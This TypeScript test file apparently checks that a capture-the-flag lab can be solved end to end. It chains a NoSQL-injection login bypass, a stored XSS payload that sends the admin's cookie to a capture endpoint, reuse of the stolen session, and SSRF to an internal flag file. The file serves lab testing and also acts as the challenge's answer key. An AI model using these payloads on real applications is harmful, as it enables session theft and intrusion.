/**
 * Full attack chain integration test.
 *
 * Executes the complete intended exploitation path:
 *   1. NoSQL injection → customer session
 *   2. Submit stored XSS payload
 *   3. Wait for admin bot → capture admin_session
 *   4. Access admin dashboard with stolen session
 *   5. SSRF to flag-service
 *   6. Extract flag
 */

import { test } from 'node:test';
import { strict as assert } from 'node:assert';
import fetch from 'node-fetch';

const BASE = process.env.APP_URL ?? 'http://localhost:8080';

function sleep(ms: number): Promise<void> {
  return new Promise(r => setTimeout(r, ms));
}

function extractCookie(headers: import('node-fetch').Headers, name: string): string | null {
  const raw = headers.raw()['set-cookie'];
  if (!raw) return null;
  for (const c of raw) {
    const m = c.match(new RegExp(`^${name}=([^;]+)`));
    if (m) return m[1];
  }
  return null;
}

test('Complete attack chain: NoSQL → XSS → Session Hijack → SSRF → Flag', async (t) => {

  // ── Stage 1: NoSQL injection ───────────────────────────────────────────────
  await t.test('Stage 1: bypass auth with NoSQL injection', async () => {
    const res = await fetch(`${BASE}/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: { $gt: '' }, password: { $gt: '' } }),
      redirect: 'manual',
    });
    // Server now returns 200 with inline redirect page so the cookie is
    // visible in the same response (Burp-friendly — no need to follow a 302)
    assert.equal(res.status, 200, 'NoSQL injection should return 200 with session cookie');
    const cookie = extractCookie(res.headers, 'session');
    assert.ok(cookie, 'Should receive a customer session cookie');
    // Stash in outer scope via closure
    (t as unknown as Record<string, unknown>)['_session'] = cookie;
  });

  const loginRes = await fetch(`${BASE}/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: { $gt: '' }, password: { $gt: '' } }),
    redirect: 'manual',
  });
  const customerSession = extractCookie(loginRes.headers, 'session')!;
  assert.ok(customerSession, 'Customer session obtained');

  // Confirm it is a customer session, NOT an admin session
  const adminCheck = extractCookie(loginRes.headers, 'admin_session');
  assert.equal(adminCheck, null, 'NoSQL injection must not yield admin_session');

  // Confirm customer session accesses /dashboard but not /admin/dashboard
  const dashRes = await fetch(`${BASE}/dashboard`, {
    headers: { Cookie: `session=${customerSession}` },
    redirect: 'manual',
  });
  assert.equal(dashRes.status, 200, 'Customer session should access /dashboard');

  const adminRes = await fetch(`${BASE}/admin/dashboard`, {
    headers: { Cookie: `session=${customerSession}` },
    redirect: 'manual',
  });
  assert.equal(adminRes.status, 403, 'Customer session must not access /admin/dashboard');

  // ── Stage 2: Submit XSS payload ────────────────────────────────────────────
  await t.test('Stage 2: submit stored XSS payload', async () => {});

  // The XSS payload reads the admin's document.cookie and POSTs it to /capture.
  // The data-message-id attribute is set on the .message-body div in the admin
  // chat template, so we target the closest [data-message-id] ancestor.
  const xssPayload = `<img src=x onerror="(function(){var el=document.querySelector('[data-message-id]');if(el){fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:el.dataset.messageId,value:document.cookie})})}})()">`;

  const submitRes = await fetch(`${BASE}/support`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Cookie: `session=${customerSession}`,
    },
    body: JSON.stringify({
      subject: 'GIS data source investigation',
      content: xssPayload,
    }),
  });
  assert.equal(submitRes.status, 200);
  const submitData = await submitRes.json() as { ok?: boolean; messageId?: string };
  assert.ok(submitData.ok, 'Message submission must succeed');
  const messageId = submitData.messageId!;
  assert.ok(messageId, 'Must receive a messageId');
  console.log(`  [chain] Message submitted: ${messageId}`);

  // ── Stage 3: Wait for bot → capture admin session ──────────────────────────
  await t.test('Stage 3: bot visits chat and XSS fires', async () => {});

  console.log('  [chain] Waiting for admin bot to trigger XSS (up to 60s)…');
  let adminSession: string | null = null;

  for (let i = 0; i < 30; i++) {
    await sleep(2000);
    const captureRes = await fetch(`${BASE}/support/capture/${messageId}`, {
      headers: { Cookie: `session=${customerSession}` },
    });
    const captureData = await captureRes.json() as { status?: string; value?: string };
    if (captureData.status === 'captured' && captureData.value) {
      console.log(`  [chain] Admin cookie captured: ${captureData.value}`);
      // Extract admin_session value from "admin_session=<token>" string
      const match = captureData.value.match(/admin_session=([^;]+)/);
      if (match) {
        adminSession = match[1];
        break;
      }
    }
  }

  assert.ok(adminSession, 'admin_session cookie must be captured via XSS within 60 seconds');

  // ── Stage 4: Access admin dashboard with stolen session ────────────────────
  await t.test('Stage 4: access admin dashboard with stolen session', async () => {});

  const adminDashRes = await fetch(`${BASE}/admin/dashboard`, {
    headers: { Cookie: `admin_session=${adminSession}` },
    redirect: 'manual',
  });
  assert.equal(adminDashRes.status, 200, 'Stolen admin_session must grant access to /admin/dashboard');

  const adminDashHtml = await adminDashRes.text();
  assert.ok(
    adminDashHtml.includes('Administrator Dashboard'),
    'Should see admin dashboard content'
  );

  // ── Stage 5: SSRF to flag-service ─────────────────────────────────────────
  await t.test('Stage 5: SSRF to internal flag service', async () => {});

  const ssrfRes = await fetch(`${BASE}/admin/tools/validate`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Cookie: `admin_session=${adminSession}`,
    },
    body: JSON.stringify({ url: 'http://127.0.0.1/flag.txt' }),
  });
  assert.equal(ssrfRes.status, 200, 'SSRF request must succeed with admin session');
  const ssrfData = await ssrfRes.json() as { status?: string; body?: string; statusCode?: number };
  assert.equal(ssrfData.status, 'ok', 'SSRF result status must be ok');
  assert.equal(ssrfData.statusCode, 200, 'flag-service must return HTTP 200');

  // ── Stage 6: Extract flag ──────────────────────────────────────────────────
  await t.test('Stage 6: extract flag from response body', async () => {});

  const body  = ssrfData.body ?? '';
  const match = body.match(/IGT\{[^}]+\}/);
  assert.ok(match, `Flag pattern not found in SSRF response body. Body: ${body.slice(0, 300)}`);

  const flag = match![0];
  console.log(`\n  ╔══════════════════════════════════════╗`);
  console.log(`  ║  FLAG: ${flag.padEnd(30)} ║`);
  console.log(`  ╚══════════════════════════════════════╝\n`);

  assert.ok(flag.startsWith('IGT{'), 'Flag must have correct format');
  assert.ok(flag.endsWith('}'), 'Flag must be properly terminated');
});
